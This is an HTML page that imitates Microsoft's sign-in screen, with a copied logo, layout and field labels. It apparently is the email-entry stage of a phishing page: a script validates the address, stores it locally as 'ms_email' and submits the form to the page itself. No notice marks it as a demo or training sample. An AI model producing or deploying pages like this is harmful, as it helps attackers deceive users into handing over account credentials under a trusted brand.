```html

<!DOCTYPE html><html><head><meta charset="UTF-8"/>
	<title>Microsoft Sign-In</title>
	<style type="text/css">*{box-sizing:border-box;margin:0;padding:0;}
body{background:#f2f2f2;font-family:'Segoe UI',Arial,sans-serif;}
.wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
.box{background:#fff;width:100%;max-width:440px;padding:44px 44px 32px;}
.logo{margin-bottom:20px;}
.title{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:6px;}
.sub{font-size:13px;color:#1b1b1b;margin-bottom:20px;}
.sub a{color:#0067b8;text-decoration:none;}
.lbl{font-size:12px;color:#605e5c;margin-bottom:3px;display:block;}
.field{border-bottom:1px solid #8a8886;margin-bottom:6px;}
.field:focus-within{border-bottom:2px solid #0067b8;}
.field.err{border-bottom:2px solid #a4262c;}
input[type=email]{width:100%;border:none;font-size:15px;outline:none;background:transparent;color:#1b1b1b;padding:6px 0;}
.errmsg{font-size:12px;color:#a4262c;margin-bottom:10px;display:none;align-items:center;gap:4px;}
.errmsg.show{display:flex;}
.link{font-size:13px;color:#0067b8;text-decoration:none;display:block;margin:10px 0;cursor:pointer;}
.chk-row{display:flex;align-items:center;gap:6px;margin-bottom:12px;}
.chk-row label{font-size:12px;color:#1b1b1b;cursor:pointer;}
.divider{border:none;border-top:1px solid #e6e6e6;margin:16px 0;}
.row{display:flex;justify-content:flex-end;margin-top:8px;}
.btn{background:#0067b8;color:#fff;border:none;padding:8px 20px;font-size:14px;font-weight:600;cursor:pointer;}
.btn:hover{background:#005a9e;}
.footer{display:flex;gap:14px;margin-top:16px;}
.footer a{font-size:11px;color:#605e5c;text-decoration:none;}
	</style>
</head>
<body>
<div class="wrap">
<div class="box">
<div class="logo"><svg height="22" viewBox="0 0 108 22" width="108"> <rect fill="#F25022" height="9" width="9" x="0" y="0"></rect> <rect fill="#7FBA00" height="9" width="9" x="10" y="0"></rect> <rect fill="#00A4EF" height="9" width="9" x="0" y="10"></rect> <rect fill="#FFB900" height="9" width="9" x="10" y="10"></rect> <text fill="#1b1b1b" font-family="Segoe UI,Arial" font-size="14" font-weight="600" x="24" y="16">Microsoft</text> </svg></div>

<div class="title">Sign in</div>

<div class="sub">No account? <a href="#">Create one!</a></div>

<form action="" id="frm" method="POST"><span class="lbl">Email, phone, or Skype</span>

<div class="field" id="fw"><input id="em" name="email" placeholder="someone@example.com" type="email"/></div>

<div class="errmsg" id="errmsg"><svg height="14" viewBox="0 0 14 14" width="14"><circle cx="7" cy="7" fill="#a4262c" r="6"></circle><path d="M7 4v3.5M7 9.2v.3" stroke="white" stroke-linecap="round" stroke-width="1.3"></path></svg> Enter a valid email address</div>
<a class="link">Can&#39;t access your account?</a>

<div class="chk-row"><input id="km" type="checkbox"/> <label for="km">Keep me signed in</label></div>

<div class="divider"> </div>

<div style="font-size:12px;color:#605e5c;margin-bottom:8px;">Sign-in options</div>

<div class="row"><button class="btn" onclick="go()" type="button">Next</button></div>
</form>

<div class="footer"><a href="#">Terms of use</a> <a href="#">Privacy &amp; cookies</a></div>
</div>
</div>
<script>
function go(){
  var e=document.getElementById('em').value.trim();
  var fw=document.getElementById('fw');
  var err=document.getElementById('errmsg');
  if(!e||!e.includes('@')||!e.includes('.')){
    fw.classList.add('err');
    err.classList.add('show');
    return;
  }
  fw.classList.remove('err');
  err.classList.remove('show');
  localStorage.setItem('ms_email', e);
  document.getElementById('frm').submit();
}
</script>

</body></html>

```
